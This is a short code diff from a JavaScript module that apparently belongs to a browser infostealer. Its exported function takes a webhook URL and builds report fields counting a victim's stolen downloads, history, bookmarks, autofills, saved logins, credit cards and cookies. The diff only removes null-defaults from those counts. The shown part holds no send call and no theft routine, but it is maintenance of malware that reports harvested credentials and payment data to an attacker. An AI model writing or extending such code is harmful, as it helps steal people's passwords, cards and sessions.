@@ -29,37 +29,37 @@ module.exports = async (webhookUrl) => {
                 fields: [
                     {
                         name: 'Downloads',
-                        value: '```' + (BrowserStats.downloadsCount ?? 0) + '```',
+                        value: '```' + BrowserStats.downloadsCount + '```',
                         inline: true,
                     },
                     {
                         name: 'Historys',
-                        value: '```' + (BrowserStats.historysCount ?? 0) + '```',
+                        value: '```' + BrowserStats.historysCount + '```',
                         inline: true,
                     },
                     {
                         name: 'Book Marks',
-                        value: '```' + (BrowserStats.bookmarksCount ?? 0) + '```',
+                        value: '```' + BrowserStats.bookmarksCount + '```',
                         inline: true,
                     },
                     {
                         name: 'Auto Fills',
-                        value: '```' + (BrowserStats.autofillsCount ?? 0) + '```',
+                        value: '```' + BrowserStats.autofillsCount + '```',
                         inline: true,
                     },
                     {
                         name: 'Logins',
-                        value: '```' + (BrowserStats.loginsCount ?? 0) + '```',
+                        value: '```' + BrowserStats.loginsCount + '```',
                         inline: true,
                     },
                     {
                         name: 'Credit Cards',
-                        value: '```' + (BrowserStats.credirCardsCount ?? 0) + '```',
+                        value: '```' + BrowserStats.credirCardsCount + '```',
                         inline: true,
                     },
                     {
                         name: 'Cookies',
-                        value: '```' + (BrowserStats.cookiesCount ?? 0) + '```',
+                        value: '```' + BrowserStats.cookiesCount + '```',
                         inline: true,
                     },
                     {
